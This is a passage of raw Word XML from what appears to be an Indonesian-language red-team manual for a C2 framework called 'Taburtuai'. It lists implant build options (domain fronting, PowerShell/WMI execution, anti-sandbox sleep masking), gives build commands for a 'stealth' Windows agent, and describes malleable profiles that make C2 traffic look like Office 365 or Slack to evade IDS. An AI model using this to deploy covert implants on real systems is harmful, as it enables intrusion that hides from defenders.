                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Transport: http|ws|dns|doh|icmp|smb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>CERT_PIN</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>SHA-256 fingerprint TLS cert server</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>FRONT_DOMAIN</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Domain fronting host header</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>KILL_DATE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Tanggal agent mati (YYYY-MM-DD)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>EXEC_METHOD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>cmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Metode eksekusi shell: cmd|powershell|wmi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>ENABLE_EVASION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>false</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Aktifkan evasion features</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>SLEEP_MASKING</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>false</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Obfuskasi sleep call (anti-sandbox)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DEBUG</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>false</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Tampilkan console window saat exit</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Build Agent Standard</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Ini adalah build paling umum untuk engagement awal. Agent menggunakan HTTP transport, interval 30 detik, dengan jitter 30%.</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C2_SERVER=http://192.168.10.5:8080 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  ENC_KEY=LabTrainingKey2026 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  INTERVAL=30 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  JITTER=30</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bin/agent_windows_stealth.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Build Agent untuk Produksi (HTTPS + Cert Pin)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Untuk engagement nyata, selalu gunakan HTTPS dan cert pinning untuk mencegah MITM/proxy inspection.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Dapatkan fingerprint sertifikat server dulu</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>openssl s_client -connect c2.yourdomain.com:8443 &lt;/dev/null 2&gt;/dev/null \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  | openssl x509 -fingerprint -sha256 -noout</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># SHA256 Fingerprint=AA:BB:CC:...</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Build dengan cert pin</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C2_SERVER=https://c2.yourdomain.com:8443 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  ENC_KEY=ProdSecret2026! \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  CERT_PIN=aabbcc...64hexchars \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  INTERVAL=60 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  JITTER=40 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  KILL_DATE=2026-12-31 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  PROFILE=office365</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Build Agent dengan Malleable Profile</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Malleable profiles mengubah tampilan HTTP traffic agar menyerupai layanan legitimate. Ini membuat traffic C2 sulit dibedakan dari traffic normal saat di-inspect oleh proxy atau IDS.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Profile</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Menyerupai</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4819"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>User-Agent</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>default</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Generic HTTP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4819"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Taburtuai/2.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>office365</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Microsoft Office 365</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4819"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Microsoft Office/16.0...</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>cdn</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>CDN asset request</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4819"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Mozilla/5.0 (CDN...)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>jquery</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>jQuery CDN fetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4819"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Mozilla/5.0 (jQuery...)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>slack</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Slack API call</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4819"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Slackbot-LinkExpanding...</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>ocsp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>OCSP certificate check</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4819"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Mozilla/5.0 (OCSP...)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
